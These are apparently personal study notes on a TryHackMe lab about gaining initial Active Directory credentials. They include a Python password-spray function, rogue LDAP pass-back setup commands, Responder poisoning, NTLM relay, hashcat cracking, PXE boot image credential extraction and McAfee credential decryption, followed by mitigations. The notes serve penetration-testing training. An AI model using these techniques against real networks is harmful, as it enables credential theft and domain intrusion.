# Breaching Active Directory
> [TryHackMe Link](https://tryhackme.com/room/breachingad)

## Testing AD Credentials
You first need to acquire a set of AD credentials looking for a way to authenticate to AD allowing for enumeration on it. Some techniques to recover AD credentials: 

## NTLM Authenticated Services
New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identity and protect the integrity and confidentiality of their activity. It can be used for authentication by using a challenge-response based scheme called NetNTLM (referred to as Windows Authentication). This challenge system can sometimes be exposed to the internet: 
- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal
- Remote Desktop Protocol (RDP) service of a server being exposed to the internet
- Exposed VPN endpoints that were integrated with AD
- Web applications that are internet-facing and make use of NetNTLM

The application plays the role of a middle man between the client and AD. All authentication material is forwarded to a Domain Controller in the form of a challenge (meaning the application is authenticating on behalf of the user and not authenticating the user directly on the application itself)
1. Application User: User Requests Access 
2. Server: Sends Challenge
3. Application User: Client Sends Response
4. Server: Sends challenge and response to DC
5. DC: Compares challenge and reesponse for authentication
6. Server: Sends DC's response

### Brute-force login attacks
If a service is publicly exposed it provides a location to test credentials discovered using other means. Use these for brute force attacks if we recovered information such as valid email addresses during our initial red team recon. 

### Password Spraying
To avoid account lockout it is better to perform password spraying attack. 

Can use tools like Hydra or custom tooling like a Python script:
```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

## LDAP Bind Credentials
Lightweight Directory Access Protocol (LDAP) is an open protocol used to access and manage directory services like Active Directory. Applications use LDAP to authenticate users by verifying their credentials directly against a domain controller. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.

The process of authentication through LDAP: 
1. User: Sends printing requests with AD username and password
2. Network Connected Printer: Uses AD credentials to create and LDAP bind request
3. DC: Provides bind response
4. Printer: Requests LDAP user search
5. DC: User search response
6. Printer: LDAP bind request with user credentials
7. DC: Sends bind responnse
8. Printer: User is authenticated and print job is accepted 

If these services are exposed to the internet they have the same attack surface as NTLM with the additional avenues of attempted AD credential recovery used by the service to gain authenticated access to AD. 

### LDAP Pass-back Attack
These can be performed when we gain access to a device's configuration where the LDAP parameters are specified (usually credentials for these interfaces are kept to the default ones, `admin:admin` or `admin:password`) but passwords are normally hidden. Can alter the LDAP configuration (IP, hostname of LDAP server) for the application to point to the rogue LDAP server. This forces the devices to attempt LDAP authentication on the rogue device and this can be intercepted to recover the credentials. 
- Common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom

Host a rogue device with a unsecure LDAP server (**OpenLDAP**) with port 389 for LDAP to ensure credentials are sent in plaintext
1. `sudo dpkg-reconfigure -p low slapd` (select No to not skip server config)
2. The DNS domain name and Organisation should be the name of the target domain
3. Select `MDB` as the LDAP database 
4. Ensure the database is not removed when purged and move old DB files before a new one is created
5. Need to make it vulnerable by downgrading the supported authentication mechanisms

Create a ldif file with content: 
```
#olcSaslSecProps.ldif 
dn: cn=config 
replace: olcSaslSecProps 
olcSaslSecProps: noanonymous,minssf=0,passcred
```
The file has the following properties:
- olcSaslSecProps: Specifies the SASL security properties
- noanonymous: Disables mechanisms that support anonymous login
- minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

6. Remove supported libraries 
   1. `dpkg -l | grep sasl` to search for more advanced mechanisms
   2. `sudo apt remove libsasl2-modules-gssapi-mid:amd64` to remove library
   3. You are looking for files like `libhssapiv.so` to remove
7. Patch the LDAP server with the unsecure .ldif file
   1. `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart` 
8. Verify configuration
   1. `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`
   2. Should only see LOGIN and PLAIN here
9.  Can now intercept and capture the login credentials in plain text to the LDAP server
   1. `sudo tcpdump -SX -i breachad tcp port 389`

## Authentication Relays

### Server Message Block (SMB)
SMB protocol allows clients to communicate with a server. In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration (i.e "out of paper" alert a computer receives). Two exploits for NetNTLM authentication with legacy SMB include:
- Offline cracking techniques to recover the password associated with the NTLM Challenge intercepted (the cracking process is significantly slower than cracking
hashes directly) 
- Using a rogue device to stage a man in the middle attack, relaying the
authentication between the client and server, which will provide us with an active authenticated session and access to the target server

### LLMNR, NBT-NS and WPAD

**Link-Local Multicast Name Resolution** (LLMNR) is a protocol based on the DNS packet format that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link.

[Responder](https://github.com/lgandx/Responder) allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they wanted to connect to. This can be used to poison any LLMNR, **NetBIOS Name Service** (NBT-NS) or **Web Proxy Auto-Discovery** requests.
- Responder attempts to force the client to connect to our Rogue device. It also starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication
-  Tries to win the race condition by poisoning the connections to ensure that you intercept the connection

These protocols allow hosts to perform their own local resolution for all hosts on the same local network. Rather than overburdening network resources such as the servers, hosts can first attempt to determine if the host they are looking for is on the same local network by broadcasting out LLMNR requests and seeing if any hosts respond. The NBT-NS is the precursor protocol to LLMNR, and WPAD requests are made to try and find a proxy for future HTTP(s) connections.  

Once intercepted responses of NTLM hashes should be available to crack for weak passwords to provide us AD credentials. Tools like hashcat can be used for this:
- `hashcat -m 5600 <hash file> <password file> --force` 

### Relaying the Challenge

This requires some prior knowledge of the accounts since the attack depends on the permission of the associated account, otherwise you are performing a blind relay. Required also is:
1. SMB  Signing should either be disabled or enabled but not enforced. When we perform a relay, we make minor changes to the request to pass it along. With SMB signing enabled, you can't forge the message signature, meaning the server would reject it.
2. The associated account needs the relevant permissions on the server to access the requested resources (ideally one with administrative privileges over the server)
3. Some guesswork is involved into what accounts will have permissions on which hosts. If we had already breached AD, we could perform some initial enumeration first, which is usually the case.

Attack flow: 
1. User: Sends NTLM Negotiate with attacker intercepts with poisoning
2. Attacker: Forwards NTLM Authenticate on behalf of user
3. Server: Responds with NTLM Challenge
4. Attacker: Forwards NTLM challenge to User
5. User: Sends challenge response created by encrypting challenge with user's hash
6. Attacker: Forwards challenge response
7. Server: Grants Access
8. Attacker: Sends Access Denied error
9. Attacker: Access server resources


## Microsoft Deployment Toolkit (MDT)
Is a Microsoft service that assists with automating the deployment of Microsoft OS. Large organisations use services such as MDT to help deploy new images in their estate more efficiently since the base images can be maintained and updated in a central location. MDT is integrated with Microsoft's System Center Configuration Manager (SCCM), which manages all updates for all Microsoft applications, services, and operating systems.
- To configure a new device they just plug in an ethernet cable and can make various changes to the boot image, such as already installing default software

### Preboot Execution Environment (PXE) boot
PXE boot allows new devices that are connected to the network to load and install the OS directly over a network connection. MDT can be used to create, manage, and host PXE boot images. PXE boot is usually integrated with DHCP, which means that if DHCPassigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. 

The communication flow is shown in the diagram below:
1. User: Sends DHCP Discover (requests IP address and PXE service info)
2. DHCP Server: Sends DHCP Offer (send open IP and PXE service info)
3. User: Sends DHCP Request (Accepts IP address)
4. DHCP Server: Sends DHCP Acknowledge
5. User: Client performs Boot Service Discovery
6. MDT Server: Server Acknowledge (sends PXE boot info)
7. User: Requests PXE Boot via TFTP
8. MDT Server: Delivers PXE Boot via TFTP

Client will then use a TFTP connection to download the PXE boot image. The PXE boot image can be exploited for two different purposes:
- Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed
- Perform password scraping attacks to recover AD credentials used during the install

### PXE Boot Image Retrieval
A complete attack of this process would require the first 4 steps above to be completed to acquire the PXE boot preconfigure details from the DHCP server such as:
- The IP of the MDT server
- Names of BCD files (store the information relevant to PXE Boots for the different types of architecture)
  - Use TFTP to request each of these BCD files and enumerate the configuration for all of them

The following steps can now be completed with the information: 
1. Use TFTP and download the BCD file to read the configuration of the MDT server
   - You can't list files with TFTP instead you send a file request and the server will connect back to us via UDP to transfer the file
   - `tftp -i <MDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd`
2. We can use a tool like [powerpxe](https://github.com/wavestone-cdt/powerpxe) to read the downloaded BCD file contents. Get-WimFile function can be used to recover the locations of the PXE Boot images from the BCD file
   - `Import-Module .\PowerPXE.ps1`
   - `$BCDFile = "conf.bcd"`
   - `Get-WimFile -bcdFile $BCDFile`
3. WIM files are bootable images in the Windows Imaging Format (WIM). Now that we have the location of the PXE Boot image, we can again use TFTP to download this image
   - tftp -i <MDT IP> GET "<PXE Boot Image Location>" pxeboot.wim

### PXE Boot Image Recovering Credentials
There are various approaches to exfiltrating stord credentials from the boot image. 
- Inject a local administrator user, so we have admin access as soon as the image boots
- Install the image to have a domain-joined machine
- Use powerpxe to recover the credentials from the bootstrap file (it extracts the image and looks for the bootstrap.ini file)
  - Get-FindCredentials -WimFile pxeboot.wim

## Configuration Files
Various configuration files may be of value for enumeration: 
- Web application config files
- Service configuration files
- Registry keys
- Centrally deployed applications

Several enumeration scripts, such as [Seatbelt](https://github.com/GhostPack/Seatbelt), can be used to automate this process.

### Credentials
Centrally deployed applications need a method to authenticate to the domain during both the installation and execution phase
- McAfee embeds the credentials  used during installation to connect back to the orchestrator in a file called `ma.db`. This database can be used to retrieve and read AD service account.
- Inside this file the AUTH_PASSWD file is  base64 encoded and encrypted with a known key and tools like [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption) can be used to break it

## Mitigations
- **User awareness and training** 
- **Limit the exposure of AD services and applications online** - Applications that support NTLM and LDAP authentication should be placed in an intranet that can be accessed through a VPN. The VPN can then support multi-factor authentication for added security.
- **Enforce Network Access Control (NAC)** - Prevent attackers from connecting rogue devices on the network and allowlist legitimate devices
- **Enforce SMB Signing** - By enforcing SMB signing, SMB relay attacks are not possible.
- **Apply principle of least privileges** - Assume an attacker is able to recover a set of credentials. This way the risk associated with these credentials being compromised can be significantly reduced.